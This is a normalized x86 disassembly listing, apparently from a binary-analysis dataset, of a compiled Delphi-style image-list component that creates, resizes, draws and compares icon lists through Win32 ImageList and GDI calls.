push ebp
push sub_44a5b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_44b3f4
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_44a5d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a5c0
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_44a5d8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44a679
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_42405c
mov eax ebx
call sub_4234dc
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41e64c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412cd4
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_4234dc
pop edx
call sub_41e9f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a680
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_44a69c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_44a5d8
pop ecx
pop edx
pop ebx
retn
sub_44a6d4
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
retn
mov [ esi + 0x34 ] edx
mov eax esi
call sub_44a5c4
test al al
je r-xdata
mov eax esi
call sub_44ad94
mov eax esi
call sub_44a5d8
mov eax esi
mov si 0xffef
call sub_403320
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_44a718
push esi
mov esi eax
cmp edx [ esi + 0x30 ]
je r-xdata
pop esi
retn
mov [ esi + 0x30 ] edx
mov eax esi
call sub_44a5c4
test al al
je r-xdata
mov eax esi
call sub_44ad94
mov eax esi
call sub_44a5d8
mov eax esi
mov si 0xffef
call sub_403320
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_44a75c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44a7fc
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44a69c
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403320
sub_44a7a8
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44b37c
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_423548
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a7fc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44a5c4
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403320
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_44a798
push eax
call ImageList_Destroy
sub_44a834
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44a8c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_44a5c4
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a8ce
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov edx eax
mov eax ebx
call sub_44ada0
sub_44a8d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44a983
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44a966
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44a5cc
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44a7a8
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44a7a8
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a96d
mov eax [ ebp - 0x10 ]
call sub_403124
retn
sub_44a9a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44aa9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44a7a8
push eax
mov eax [ ebp - 0x4 ]
call sub_44a798
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44aaa6
mov eax [ ebp - 0xc ]
call sub_403124
retn
cmp esi 0xffffffff
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44aa61
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebp - 0x10 ]
call sub_424400
mov eax [ ebp - 0x4 ]
call sub_44a5cc
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44a788
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44a7a8
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403124
retn
sub_44aabc
push ebx
mov ebx eax
mov eax ebx
call sub_44a5c4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44a798
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_44aae0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44acf7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44a5c4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403320
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44acfe
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f1c
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44b37c
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44a9a0
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
xor eax eax
push ebp
push sub_44aca8
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44ac88
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44ac6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_4242ac
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_4234dc
call sub_41ed94
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44a798
push eax
call ImageList_Draw
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_4234dc
call sub_41ed94
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44a798
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_44a798
push eax
call ImageList_Replace
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ac72
mov eax [ ebp - 0x10 ]
call sub_403124
retn
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
sub_44ad08
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44ad87
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44aabc
cmp esi eax
jl r-xdata
mov eax ebx
call sub_44a5c4
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
mov eax ebx
mov si 0xffef
call sub_403320
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ad8e
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
push esi
mov eax ebx
call sub_44a798
push eax
call ImageList_Remove
sub_44ada0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44a5c4
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_44a3c0
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403320
pop esi
pop ebx
retn
sub_44add8
push ebx
mov ebx eax
mov eax ebx
call sub_44a5c4
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_44a798
push eax
call ImageList_GetBkColor
call sub_44a3e0
pop ebx
retn
sub_44ae00
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_44a5c4
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_44a3c0
push eax
mov eax ebx
call sub_44add8
call sub_44a3c0
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_41ed94
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44a798
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_4234dc
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41e64c
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_412cd4
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_4234dc
pop edx
call sub_41e9f0
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_4234dc
call sub_41ed94
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44a798
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_412cd4
mov eax [ ebx + 0x54 ]
call sub_4234dc
call sub_41ed94
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_41e64c
mov eax edi
call sub_41ed94
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_41e64c
mov eax edi
call sub_41ed94
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_4242ac
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_44afd4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_44aff8
pop ebx
pop ebp
retn 0xc
sub_44aff8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44a5c4
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44b044
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412cd4
mov eax [ ebp - 0x4 ]
call sub_44bcd8
xor eax eax
push ebp
push sub_44b1dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44b1c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44b1a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_4242ac
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b1aa
mov eax [ ebp - 0x10 ]
call sub_403124
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_4234dc
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_41e9f0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_41ed94
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_4234dc
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41e9f0
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_41ed94
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44a8d4
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_44b1ec
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44a798
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_44b044
sub_44b20c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax ebx
call sub_44a7fc
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41471c
mov eax ebx
call sub_44ad94
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44b3f4
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_44a798
mov edx eax
mov eax ebx
call sub_44a69c
mov eax ebx
call sub_44a5c4
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44a798
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44a5cc
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44a798
push eax
call ImageList_GetBkColor
call sub_44a3e0
mov edx eax
mov eax ebx
call sub_44ada0
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_44b1ec
jmp r-xdata
sub_44b2cc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_414800
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44b3f4
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_44ad94
mov eax esi
call sub_44a798
mov edx eax
mov eax ebx
call sub_44a69c
mov eax ebx
call sub_44a5c4
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44a798
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44a5cc
jmp r-xdata
mov eax esi
call sub_44a798
push eax
call ImageList_GetBkColor
call sub_44a3e0
mov edx eax
mov eax ebx
call sub_44ada0
mov edx esi
mov eax ebx
call sub_44b1ec
pop esi
pop ebx
retn
sub_44b37c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44b3e8
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b3ef
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_44b41c
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_414108
mov si 0xffff
call sub_403320
inc ebp
dec edi
jne r-xdata
sub_44b46c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413ff8
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_414108
cmp ebp eax
jne r-xdata
sub_44b4c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407bec
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44b508
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_44aabc
mov ebx eax
mov eax edi
call sub_44aabc
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_44aabc
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44b5e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44b5c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_44b4c4
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b5ce
mov eax [ ebp - 0xc ]
call sub_403124
retn
mov eax edi
call sub_44aabc
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_44b5f8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44aabc
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44b508
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_44b654
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41adf4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_44b5f8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44b6ac
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41688c
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41688c
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f14
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44b930
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416660
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
